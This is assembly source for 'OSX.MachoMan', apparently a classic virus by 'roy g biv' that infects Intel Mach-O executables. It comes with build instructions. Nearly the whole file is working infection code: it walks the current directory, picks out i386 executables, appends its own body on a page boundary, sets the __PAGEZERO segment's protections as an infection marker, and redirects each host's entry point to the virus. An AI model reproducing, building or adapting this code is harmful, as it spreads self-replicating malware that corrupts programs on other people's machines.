//OSX.MachoMan by roy g biv
//
//- parasitic direct action infector of Intel Mach-O files in current directory
//
//to build this thing:
//gcc
//----
//gcc -arch i386 machoman.s -o machoman

.text
.align 0
.globl _main

Lmacho_begin:
        push    $0x21626772                     //replaced by host entrypoint
        .byte   0xc8, 0x38, 0, 0                //enter 0, Ldata_end - Ldata - $0x30
        push    $0x2e                           //demo version, current directory only
        mov     %esp, %ecx
        xor     %eax, %eax
        push    %eax
        push    %eax
        push    %ecx
        push    %eax
        mov     $5, %al                         //open
        int     $0x80
        xchg    %eax, %ebx
        xor     %eax, %eax
        push    %eax
        push    $-1
        push    $0x1000                         //MAP_ANON
        pop     %ecx
        push    %ecx
        push    $3                              //PROT_READ | PROT_WRITE
        push    %ecx
        push    %eax
        push    %eax
        mov     $0xc5, %al                      //mmap
        int     $0x80
        xchg    %eax, %esi

Lget_ent:
        push    %esp
        push    $0x1000
        push    %esi
        push    %ebx
        push    %eax
        xor     %eax, %eax
        mov     $0xc4, %al                      //getdirentries
        int     $0x80
        cmp     $0, %eax
        jle     Lunmap_info
        add     $0x14, %esp
        lea     (%esi, %eax), %edi
        push    %ebx
        push    %esi

Ltest_file:
        .byte   0x80, 0x7e, Ld_type - Ldirent, 8
                                                //cmpb DT_REG, (%esi)
        je      Lopen_file                      //only regular files

Lnext_file:
        .byte   0x0f, 0xb7, 0x46, Ld_reclen - Ldirent
                                                //movzwl Ld_reclen - Ldirent(%esi), %eax
        add     %eax, %esi
        cmp     %edi, %esi
        jb      Ltest_file
        pop     %esi
        pop     %ebx
        jmp     Lget_ent
        .ascii  "MachoMan - roy g biv"

Lunmap_info:
        push    $0x1000
        push    %esi
        push    %eax
        push    $0x49                           //munmap
        pop     %eax
        int     $0x80
        push    %ebx
        push    %eax
        mov     $6, %al                         //close
        int     $0x80
        leave
        ret
        .ascii  "26/10/06"

Lopen_file:
        push    $0x20                           //O_EXLOCK
        push    $2                              //O_RDWR
        .byte   0x8d, 0x46, Ld_name - Ldirent   //lea Ld_name - Ldirent(%esi), %eax
        push    %eax
        push    %eax
        push    $5                              //open
        pop     %eax
        int     $0x80
        add     $0x10, %esp
        cmp     $0, %eax
        jle     Lnext_file
        xchg    %eax, %ebx
        push    %esi
        push    %edi
        .byte   0x6a, Lmach_header_end - Lmach_header
                                               //push Lmach_header_end - Lmach_header
        pop     %edi
        push    %edi
        .byte   0x8d, 0x75, Ldata - Ldata_end  //lea Ldata - Ldata_end(%ebp), %esi
        push    %esi
        push    %ebx
        push    %eax
        push    $3                              //read
        pop     %eax
        int     $0x80

//-----------------------------------------------------------------------------
//test if file is infectable (Intel format Mach-O, 386+, executable, not infected, etc)
//-----------------------------------------------------------------------------

        lodsl
        cmp     $0xfeedface, %eax               //MH_MAGIC
        jne     Lclose_file2
        lodsl
        cmp     $7, %eax                        //CPU_TYPE_I386
        jne     Lclose_file2
        lodsl
        lodsl
        cmp     $2, %eax                        //MH_EXECUTE
        jne     Lclose_file2
        lodsl
        test    %eax, %eax
        je      Lclose_file2
        push    $0
        push    %edi
        xchg    %eax, %edi

Lexam_cmds:
        .byte   0x6a, Lthread_command_end - Lload_command
                                                //push Lthread_command_end - Lload_command
        push    %esi
        push    %ebx
        push    %eax
        push    $3                              //read
        pop     %eax
        int     $0x80
        add     $0x10, %esp
        push    %esi
        lodsl
        xchg    %eax, %ecx
        lodsl
        pop     %esi
        .byte   0x0f, 0xc1, 0x46, 0xc4          //xadd %eax, $-0x3c(%esi)
        loop    Ltest_thread                    //LC_SEGMENT
        xchg    %eax, %ecx
        .byte   0x0f, 0xb1, 0x4e, 0xc8          //cmpxchg %ecx, $-0x38(%esi)
        jne     Lskip_command
        .byte   0x6a, Lsegment_command_end - Lthread_command_end
                                                //push Lsegment_command_end - Lthread_command_end
        push    %esi
        push    %ebx
        push    %eax
        mov     $3, %al                         //read
        int     $0x80
        add     $0x10, %esp

//-----------------------------------------------------------------------------
//infection marker is that __PAGEZERO protection is non-zero
//-----------------------------------------------------------------------------

        .byte   0x83, 0x7e, Lsc_initprot - Lthread_command_end, 0
                                                //cmpd $0, Lsc_initprot - Lthread_command_end(%esi)
        jne     Lclose_file

Lskip_command:
        pop     %ecx
        push    %ecx
        xor     %eax, %eax
        push    %eax                            //SEEK_SET
        push    %eax
        push    %ecx
        push    %ebx
        push    %eax
        mov     $0xc7, %al                      //lseek
        int     $0x80
        add     $0x14, %esp
        dec     %edi
        jne     Lexam_cmds

Lclose_file:
        pop     %eax
        pop     %eax

Lclose_file2:
        push    %ebx
        push    %eax
        push    $6                              //close
        pop     %eax
        int     $0x80
        add     $0x18, %esp
        pop     %edi
        pop     %esi
        jmp     Lnext_file

Ltest_thread:
        cmp     $4, %ecx                        //LC_UNIXTHREAD - 1
        jne     Lskip_command
        .byte   0x87, 0x46, Ltc_flavor - Lload_command
                                                //xchg Ltc_flavor - Lload_command(%esi), %eax
        dec     %eax
        jne     Lskip_command                   //i386_NEW_THREAD_STATE
        pop     %ecx
        pop     %ecx
        jecxz   Lclose_file2
        push    %ecx
        push    %ebp
        .byte   0x6a, Li386_thread_state_t_end - Li386_thread_state_t
                                                //push Li386_thread_state_t_end - Li386_thread_state_t
        .byte   0x83, 0xc6, Li386_thread_state_t - Lload_command
                                                //add esi, Li386_thread_state_t - Lload_command
        push    %esi
        push    %ebx
        push    %eax
        mov     $3, %al                         //read
        int     $0x80
        push    $2                              //SEEK_END
        push    $0
        push    $0
        push    %ebx
        push    %eax
        mov     $0xc7, %al                      //lseek
        int     $0x80

//-----------------------------------------------------------------------------
//round up file size to nearest page, then append virus code
//-----------------------------------------------------------------------------

        mov     $0x1000, %edi
        sub     %eax, %edi
        and     $0xfff, %edi
        add     %edi, %eax
        .byte   0x89, 0x46, Lsc_fileoff - Li386_thread_state_t
                                                //mov %eax, Lsc_fileoff - Li386_thread_state_t(%esi)
        .byte   0xb8
        .long   Lmacho_end - Lmacho_begin       //mov Lmacho_end - Lmacho_begin, %eax
        .byte   0x89, 0x46, Lsc_filesize - Li386_thread_state_t
                                                //mov %eax, Lsc_filesize - Li386_thread_state_t(%esi)
        lea     (%edi, %eax), %ecx
        push    %ecx
        push    %ecx
        push    %eax
        xor     %eax, %eax
        push    %eax
        push    $-1
        push    $0x1000                         //MAP_ANON
        push    $3                              //PROT_READ | PROT_WRITE
        push    %ecx
        push    %eax
        push    %eax
        mov     $0xc5, %al                      //mmap
        int     $0x80
        add     $0x1c, %esp
        pop     %ecx
        push    %eax
        push    %ebx
        push    %eax
        add     %eax, %edi
        xchg    %eax, %ebp
        .byte   0x8b, 0x46, Lis_eip - Li386_thread_state_t
                                                //mov Lis_eip - Li386_thread_state_t(%esi), %eax
        push    %esi
        push    %edi
        xor     %esi, %esi
        rep     movsb
        pop     %edi
        pop     %esi
        inc     %edi
        stosl
        push    $4                              //write
        pop     %eax
        int     $0x80
        add     $0x10, %esp
        push    %ebp
        push    %eax
        push    $0x49                           //munmap
        pop     %eax
        int     $0x80
        add     $0x30, %esp
        pop     %ebp
        .byte   0xc6, 0x46, Lsc_maxprot - Li386_thread_state_t, 5
                                                //movb PROT_READ | PROT_EXEC, Lsc_maxprot - Li386_thread_state_t(%esi)
        .byte   0xc6, 0x46, Lsc_initprot - Li386_thread_state_t, 5
                                                //movb PROT_READ | PROT_EXEC, Lsc_initprot - Li386_thread_state_t(%esi)
        pop     %ecx
        add     $0x20, %ecx                     //(Lload_command_end - Lload_command) + (Lsc_fileoff - Lsegment_command)
        push    %eax                            //SEEK_SET
        push    %eax
        push    %ecx
        push    %ebx
        push    %eax
        mov     $0xc7, %al                      //lseek
        int     $0x80
        .byte   0x6a, (Lsc_initprot - Lsc_fileoff) + 1
                                                //push Lsc_initprot - Lsc_fileoff + 1
        .byte   0x8d, 0x46, Lsc_fileoff - Li386_thread_state_t
                                                //lea Lsc_fileoff - Li386_thread_state_t(%esi), %eax
        push    %eax
        push    %ebx
        push    %eax
        push    $4                              //write
        pop     %eax
        int     $0x80
        xor     %eax, %eax
        push    %eax
        push    %eax                            //SEEK_SET
        push    %eax
        .byte   0x8b, 0x4e, Ltc_flavor - Li386_thread_state_t
                                                //mov Ltc_flavor - Li386_thread_state_t(%esi), %ecx
        add     $0x38, %ecx                     //(Lload_command_end - Lload_command) + (Lthread_command_end - Lthread_command) + (Lis_eip - Li386_thread_state_t)
        push    %ecx
        push    %ebx
        push    %eax
        mov     $0xc7, %al                      //lseek
        int     $0x80

//-----------------------------------------------------------------------------
//new entrypoint is 0, start of __PAGEZERO data
//-----------------------------------------------------------------------------

        mov     %esp, %ecx
        push    $4                              //write
        pop     %eax
        push    %eax
        push    %ecx
        push    %ebx
        push    %eax
        int     $0x80
        add     $0x4c, %esp
        jmp     Lclose_file2

Lmacho_end:

_main:
        .byte   0xc8, 0x38, 0, 0                //enter 0, Ldata_end - Ldata - $0x30
        push    $0x2e                           //demo version, current directory only
        mov     %esp, %ecx
        xor     %eax, %eax
        push    %eax
        push    %eax
        push    %ecx
        push    %eax
        mov     $5, %al                         //open
        int     $0x80
        xchg    %eax, %ebx
        xor     %eax, %eax
        push    %eax
        push    $-1
        push    $0x1000                         //MAP_ANON
        pop     %ecx
        push    %ecx
        push    $3                              //PROT_READ | PROT_WRITE
        push    %ecx
        push    %eax
        push    %eax
        mov     $0xc5, %al                      //mmap
        int     $0x80
        xchg    %eax, %esi

L_get_ent:
        push    %esp
        push    $0x1000
        push    %esi
        push    %ebx
        push    %eax
        xor     %eax, %eax
        mov     $0xc4, %al                      //getdirentries
        int     $0x80
        cmp     $0, %eax
        jle     L_unmap_info
        add     $0x14, %esp
        lea     (%esi, %eax), %edi
        push    %ebx
        push    %esi

L_test_file:
        .byte   0x80, 0x7e, Ld_type - Ldirent, 8
                                                //cmpb DT_REG, (%esi)
        je      L_open_file                     //only regular files

L_next_file:
        .byte   0x0f, 0xb7, 0x46, Ld_reclen - Ldirent
                                                //movzwl Ld_reclen - Ldirent(%esi), %eax
        add     %eax, %esi
        cmp     %edi, %esi
        jb      L_test_file
        pop     %esi
        pop     %ebx
        jmp     L_get_ent

L_unmap_info:
        push    $0x1000
        push    %esi
        push    %eax
        push    $0x49                           //munmap
        pop     %eax
        int     $0x80
        push    %ebx
        push    %eax
        mov     $6, %al                         //close
        int     $0x80
        .byte   0x6a, Ltxtbody_end - Ltxtbody   //push Ltxtbody_end - Ltxtbody
        .byte   0x68
        .long   Ltxtbody                        //push Ltxtbody
        push    $1
        push    %eax
        mov     $4, %al                         //write
        int     $0x80
        push    %eax
        push    %eax
        mov     $1, %al                         //exit
        int     $0x80

L_open_file:
        push    $0x20                           //O_EXLOCK
        push    $2                              //O_RDWR
        .byte   0x8d, 0x46, Ld_name - Ldirent   //lea Ld_name - Ldirent(%esi), %eax
        push    %eax
        push    %eax
        push    $5                              //open
        pop     %eax
        int     $0x80
        add     $0x10, %esp
        cmp     $0, %eax
        jle     L_next_file
        xchg    %eax, %ebx
        push    %esi
        push    %edi
        .byte   0x6a, Lmach_header_end - Lmach_header
                                               //push Lmach_header_end - Lmach_header
        pop     %edi
        push    %edi
        .byte   0x8d, 0x75, Ldata - Ldata_end  //lea Ldata - Ldata_end(%ebp), %esi
        push    %esi
        push    %ebx
        push    %eax
        push    $3                              //read
        pop     %eax
        int     $0x80
        lodsl
        cmp     $0xfeedface, %eax               //MH_MAGIC
        jne     L_close_file2
        lodsl
        cmp     $7, %eax                        //CPU_TYPE_I386
        jne     L_close_file2
        lodsl
        lodsl
        cmp     $2, %eax                        //MH_EXECUTE
        jne     L_close_file2
        lodsl
        test    %eax, %eax
        je      L_close_file2
        push    $0
        push    %edi
        xchg    %eax, %edi

L_exam_cmds:
        .byte   0x6a, Lthread_command_end - Lload_command
                                                //push Lthread_command_end - Lload_command
        push    %esi
        push    %ebx
        push    %eax
        push    $3                              //read
        pop     %eax
        int     $0x80
        add     $0x10, %esp
        push    %esi
        lodsl
        xchg    %eax, %ecx
        lodsl
        pop     %esi
        .byte   0x0f, 0xc1, 0x46, 0xc4          //xadd %eax, $-0x3c(%esi)
        loop    L_test_thread                   //LC_SEGMENT
        xchg    %eax, %ecx
        .byte   0x0f, 0xb1, 0x4e, 0xc8          //cmpxchg %ecx, $-0x38(%esi)
        jne     L_skip_command
        .byte   0x6a, Lsegment_command_end - Lthread_command_end
                                                //push Lsegment_command_end - Lthread_command_end
        push    %esi
        push    %ebx
        push    %eax
        mov     $3, %al                         //read
        int     $0x80
        add     $0x10, %esp
        .byte   0x83, 0x7e, Lsc_initprot - Lthread_command_end, 0
                                                //cmpd $0, Lsc_initprot - Lthread_command_end(%esi)
        jne     L_close_file

L_skip_command:
        pop     %ecx
        push    %ecx
        xor     %eax, %eax
        push    %eax                            //SEEK_SET
        push    %eax
        push    %ecx
        push    %ebx
        push    %eax
        mov     $0xc7, %al                      //lseek
        int     $0x80
        add     $0x14, %esp
        dec     %edi
        jne     L_exam_cmds

L_close_file:
        pop     %eax
        pop     %eax

L_close_file2:
        push    %ebx
        push    %eax
        push    $6                              //close
        pop     %eax
        int     $0x80
        add     $0x18, %esp
        pop     %edi
        pop     %esi
        jmp     L_next_file

L_test_thread:
        cmp     $4, %ecx                        //LC_UNIXTHREAD - 1
        jne     L_skip_command
        .byte   0x87, 0x46, Ltc_flavor - Lload_command
                                                //xchg Ltc_flavor - Lload_command(%esi), %eax
        dec     %eax
        jne     L_skip_command                  //i386_NEW_THREAD_STATE
        pop     %ecx
        pop     %ecx
        jecxz   L_close_file2
        push    %ecx
        push    %ebp
        .byte   0x6a, Li386_thread_state_t_end - Li386_thread_state_t
                                                //push Lsegment_command_end - Lthread_command_end
        .byte   0x83, 0xc6, Li386_thread_state_t - Lload_command
                                                //add esi, Li386_thread_state_t - Lload_command
        push    %esi
        push    %ebx
        push    %eax
        mov     $3, %al                         //read
        int     $0x80
        push    $2                              //SEEK_END
        push    $0
        push    $0
        push    %ebx
        push    %eax
        mov     $0xc7, %al                      //lseek
        int     $0x80
        mov     $0x1000, %edi
        sub     %eax, %edi
        and     $0xfff, %edi
        add     %edi, %eax
        .byte   0x89, 0x46, Lsc_fileoff - Li386_thread_state_t
                                                //mov %eax, Lsc_fileoff - Li386_thread_state_t(%esi)
        .byte   0xb8
        .long   Lmacho_end - Lmacho_begin       //mov Lmacho_end - Lmacho_begin, %eax
        .byte   0x89, 0x46, Lsc_filesize - Li386_thread_state_t
                                                //mov %eax, Lsc_filesize - Li386_thread_state_t(%esi)
        lea     (%edi, %eax), %ecx
        push    %ecx
        push    %ecx
        push    %eax
        xor     %eax, %eax
        push    %eax
        push    $-1
        push    $0x1000                         //MAP_ANON
        push    $3                              //PROT_READ | PROT_WRITE
        push    %ecx
        push    %eax
        push    %eax
        mov     $0xc5, %al                      //mmap
        int     $0x80
        add     $0x1c, %esp
        pop     %ecx
        push    %eax
        push    %ebx
        push    %eax
        add     %eax, %edi
        xchg    %eax, %ebp
        .byte   0x8b, 0x46, Lis_eip - Li386_thread_state_t
                                                //mov Lis_eip - Li386_thread_state_t(%esi), %eax
        push    %esi
        push    %edi
        .byte   0xbe
        .long   Lmacho_begin                    //mov Lmacho_begin, %esi
        rep     movsb
        pop     %edi
        pop     %esi
        inc     %edi
        stosl
        push    $4                              //write
        pop     %eax
        int     $0x80
        add     $0x10, %esp
        push    %ebp
        push    %eax
        push    $0x49                           //munmap
        pop     %eax
        int     $0x80
        add     $0x30, %esp
        pop     %ebp
        .byte   0xc6, 0x46, Lsc_maxprot - Li386_thread_state_t, 5
                                                //movb PROT_READ | PROT_EXEC, Lsc_maxprot - Li386_thread_state_t(%esi)
        .byte   0xc6, 0x46, Lsc_initprot - Li386_thread_state_t, 5
                                                //movb PROT_READ | PROT_EXEC, Lsc_initprot - Li386_thread_state_t(%esi)
        pop     %ecx
        add     $0x20, %ecx                     //(Lload_command_end - Lload_command) + (Lsc_fileoff - Lsegment_command)
        push    %eax                            //SEEK_SET
        push    %eax
        push    %ecx
        push    %ebx
        push    %eax
        mov     $0xc7, %al                      //lseek
        int     $0x80
        .byte   0x6a, Lsc_nsects - Lsc_fileoff  //push Lsc_nsects - Lsc_fileoff
        .byte   0x8d, 0x46, Lsc_fileoff - Li386_thread_state_t
                                                //lea Lsc_fileoff - Li386_thread_state_t(%esi), %eax
        push    %eax
        push    %ebx
        push    %eax
        push    $4                              //write
        pop     %eax
        int     $0x80
        xor     %eax, %eax
        push    %eax
        push    %eax                            //SEEK_SET
        push    %eax
        .byte   0x8b, 0x4e, Ltc_flavor - Li386_thread_state_t
                                                //mov Ltc_flavor - Li386_thread_state_t(%esi), %ecx
        add     $0x38, %ecx                     //(Lload_command_end - Lload_command) + (Lthread_command_end - Lthread_command) + (Lis_eip - Li386_thread_state_t)
        push    %ecx
        push    %ebx
        push    %eax
        mov     $0xc7, %al                      //lseek
        int     $0x80
        mov     %esp, %ecx
        push    $4                              //write
        pop     %eax
        push    %eax
        push    %ecx
        push    %ebx
        push    %eax
        int     $0x80
        add     $0x4c, %esp
        jmp     L_close_file2

Ldata:
Lmach_header:
Lmh_magic:
        .long   0
Lmh_cputype:
        .long   0
Lmh_cpusubtype:
        .long   0
Lmh_filetype:
        .long   0
Lmh_ncmds:
        .long   0
Lmh_sizeofcmds:
Lload_command:
Llc_cmd:
        .long   0
Lmh_flags:
Llc_cmdsize:
        .long   0
Lmach_header_end:
Lload_command_end:
Lsegment_command:
Lsc_segname:
Lthread_command:
Ltc_flavor:
        .long   0
Ltc_count:
        .long   0
Lthread_command_end:
Lsc_vmaddr:
        .long   0
Lsc_vmsize:
        .long   0
Lsc_fileoff:
        .long   0
Lsc_filesize:
        .long   0
Lsc_maxprot:
        .long   0
Lsc_initprot:
        .long   0
Lsc_nsects:
Lsegment_command_end:
Li386_thread_state_t:
Lis_eax:
        .long   0
Lis_ebx:
        .long   0
Lis_ecx:
        .long   0
Lis_edx:
        .long   0
Lis_edi:
        .long   0
Lis_esi:
        .long   0
Lis_ebp:
        .long   0
Lis_esp:
        .long   0
Lis_ss:
        .long   0
Lis_eflags:
        .long   0
Lis_eip:
        .long   0
Li386_thread_state_t_end:
Ldata_end:

Ldirent:
Ld_fileno:
        .long   0
Ld_reclen:
        .short  0
Ld_type:
        .byte   0
Ld_namlen:
        .byte   0
Ld_name:
        .byte   0

Ltxtbody:
        .ascii  "MachoMan running...\n"
Ltxtbody_end:
        .byte   0
